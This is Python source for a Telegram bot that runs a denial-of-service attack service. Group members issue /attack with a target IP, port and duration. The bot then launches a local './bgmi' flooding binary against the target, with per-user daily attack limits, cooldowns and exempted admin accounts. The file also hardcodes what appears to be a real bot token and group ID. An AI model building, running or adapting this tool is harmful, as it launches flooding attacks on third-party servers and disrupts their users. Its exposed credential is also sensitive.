import os
import telebot
import logging
import asyncio
from datetime import datetime, timedelta, timezone

# Initialize logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# Telegram bot token and group ID
TOKEN = '7931184714:AAH_FkdQnmVH3th14W7BDkpP0LTZ4DLnM_c'  # Replace with your actual bot token
GROUP_ID = '-1002191672918'  # Replace with your specific group ID
CHANNEL_INVITE_LINK = "https://t.me/+lgb92RXeI2E4ZjM1"  # Replace with your private channel invite link
bot = telebot.TeleBot(TOKEN)

# Global variables
user_attacks = {}
user_cooldowns = {}
reset_time = datetime.now().astimezone(timezone(timedelta(hours=5, minutes=30))).replace(hour=0, minute=0, second=0, microsecond=0)

# Attack control variables
COOLDOWN_DURATION = 200
DAILY_ATTACK_LIMIT = 6
EXEMPTED_USERS = [1342302666, 1235767855]
current_attacker = None
attack_end_time = None

# Users who confirmed they have joined the channel
joined_users = set()

# Function to reset daily attack limits
def reset_daily_counts():
    global reset_time
    ist_now = datetime.now(timezone.utc).astimezone(timezone(timedelta(hours=5, minutes=30)))
    if ist_now >= reset_time + timedelta(days=1):
        user_attacks.clear()
        user_cooldowns.clear()
        reset_time = ist_now.replace(hour=0, minute=0, second=0, microsecond=0) + timedelta(days=1)

# Welcome new members
@bot.message_handler(content_types=['new_chat_members'])
def welcome_new_member(message):
    for user in message.new_chat_members:
        welcome_text = (f"👋 Welcome **{user.first_name}** to the LEGACY VIP group! 🚀\n\n"
                        "🔥 **Enjoy Free BOT sponsored by ☢️*NINJA MODS*☢️ for its subscribers!**\n"
                        f"👑 Managed by *@LEGACY4REAL0*")
        bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown")

# Handle `/joined` command to confirm user has joined the channel
@bot.message_handler(commands=['joined'])
def confirm_joined(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name or "Unknown"

    if user_id in joined_users:
        bot.send_message(message.chat.id, f"🎉 **{user_name}**, you've already confirmed your membership in the channel!")
    else:
        joined_users.add(user_id)
        bot.send_message(message.chat.id, f"🎉 **{user_name}**, you've successfully joined the channel and can now use the bot!")

# Attack command
@bot.message_handler(commands=['attack'])
def attack_command(message):
    global current_attacker, attack_end_time

    user_id = message.from_user.id
    user_name = message.from_user.first_name or "Unknown"

    if str(message.chat.id) != GROUP_ID:
        bot.send_message(message.chat.id, "🚨 This bot only works in LEGACY VIP GROUP! 🚨")
        return

    # Check if user has joined the private channel
    if user_id not in joined_users:
        bot.send_message(message.chat.id, f"🚨 You must join the private channel to use this bot. Please join here: {CHANNEL_INVITE_LINK}")
        bot.send_message(message.chat.id, "After joining, send the command `/joined` to access the bot.")
        return

    reset_daily_counts()

    if user_id not in EXEMPTED_USERS:
        if current_attacker:
            remaining_time = (attack_end_time - datetime.now()).total_seconds() if attack_end_time else 0
            minutes, seconds = divmod(max(remaining_time, 0), 60)
            bot.send_message(message.chat.id, f"⚠️ {user_name}, another user is executing an attack. Please wait {int(minutes)}m {int(seconds)}s.")
            return

        if user_cooldowns.get(user_id, datetime.min) > datetime.now():
            remaining_time = (user_cooldowns[user_id] - datetime.now()).seconds
            bot.send_message(message.chat.id, f"⏳ {user_name}, you are on cooldown. Try again in {remaining_time // 60}m {remaining_time % 60}s.")
            return

        if user_attacks.get(user_id, 0) >= DAILY_ATTACK_LIMIT:
            bot.send_message(message.chat.id, f"🚫 {user_name}, you've reached your daily attack limit. Come back tomorrow!")
            return

    try:
        args = message.text.split()[1:]
        if len(args) != 3:
            raise ValueError("⚙️ Usage: `/attack <target_ip> <target_port> <duration>`")

        target_ip, target_port, user_duration = args

        if not target_ip.count('.') == 3 or not all(i.isdigit() and 0 <= int(i) <= 255 for i in target_ip.split('.')):
            raise ValueError("❌ Invalid IP address.")
        if not target_port.isdigit() or not (0 <= int(target_port) <= 65535):
            raise ValueError("❌ Invalid port number.")
        if not user_duration.isdigit() or int(user_duration) <= 0:
            raise ValueError("❌ Duration must be a positive number.")

        if user_id not in EXEMPTED_USERS:
            user_attacks[user_id] = user_attacks.get(user_id, 0) + 1
            user_cooldowns[user_id] = datetime.now() + timedelta(seconds=COOLDOWN_DURATION)

        current_attacker = user_id
        attack_duration = 120
        attack_end_time = datetime.now() + timedelta(seconds=attack_duration)

        bot.send_message(
            message.chat.id,
            f"🚀 **{user_name}, attack initiated!**\n\n"
            f"🎯 Target: `{target_ip}:{target_port}`\n"
            f"⏳ Duration: {attack_duration}s\n\n"
            "⚡ **Stay tuned for the results!**"
        )

        asyncio.run(run_attack_command_async(target_ip, int(target_port), attack_duration, user_name))

    except Exception as e:
        bot.send_message(message.chat.id, str(e))

async def run_attack_command_async(target_ip, target_port, duration, user_name):
    global current_attacker, attack_end_time

    try:
        command = f"./bgmi {target_ip} {target_port} {duration} 15 600"
        process = await asyncio.create_subprocess_shell(command)
        await process.communicate()

        bot.send_message(GROUP_ID, f"✅ **Attack completed on `{target_ip}:{target_port}`!**")

    except Exception as e:
        bot.send_message(GROUP_ID, f"❌ Error executing attack: {e}")

    finally:
        current_attacker = None
        attack_end_time = None

if __name__ == "__main__":
    logging.info("Bot is running...")
    bot.polling(none_stop=True)